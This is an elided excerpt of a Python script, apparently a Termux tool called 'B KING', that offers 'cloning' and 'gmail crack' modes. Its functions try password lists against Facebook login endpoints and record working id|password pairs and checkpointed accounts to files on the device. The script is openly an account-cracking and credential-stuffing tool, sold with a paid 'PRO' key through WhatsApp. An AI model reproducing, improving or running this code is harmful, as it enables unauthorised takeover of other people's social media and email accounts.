...
os.system('xdg-open https://www.facebook.com/100001838504374/')
...
\x1b[1;92m| $$  \ $$| $$\  $$   | $$  | $$\  $$$| $$  \ $$
\x1b[1;92m| $$$$$$$/| $$ \  $$ /$$$$$$| $$ \  $$|  $$$$$$/
\x1b[1;92m|_______/ |__/  \__/|______/|__/  \__/ \______/ 
...
----------------------------------------------
 \x1b[1;92mAuthor    : Bashar Ahmadzai
 \x1b[1;92mGithub    : Basharahmadzai002
 \x1b[1;92mFacebook  : Bashar Ahmadzai
 \x1b[1;92mTool Name : B KING
\x1b[1;92m Type type : Free
 \x1b[1;92mVersion   : 1.9.8
----------------------------------------------
 B KING version 1.9.8
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print(' \x1b[1;92m[1] File cloning\n\x1b[1;92m [2] \x1b[1;92mCreate ids file\n [3] \x1b[1;92mPublic cloning\n\x1b[1;92m [4] Random number cloning\n \x1b[1;92m[5] Random gmail crack\n \x1b[1;92m[6] WhatsApp Group (join)\n \x1b[1;92m[7] Download Vpn\n \x1b[1;92m[8] How To Use Video\n \x1b[1;92m[0] Exit menu')
                        linex()
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/100001838504374/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+93782989190&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Bking Sir, I Need To Buy Your Paid BKING PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python BKING.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [BKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [BKING-OK] %s | %s'%(ids,pas))
                                open('/sdcard/BKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [BKING-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [BKING-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BKING-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/BKING-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [BKING-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/BKING-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [BKING-OK] '+uid+' | '+pas+'\033[1;97m')
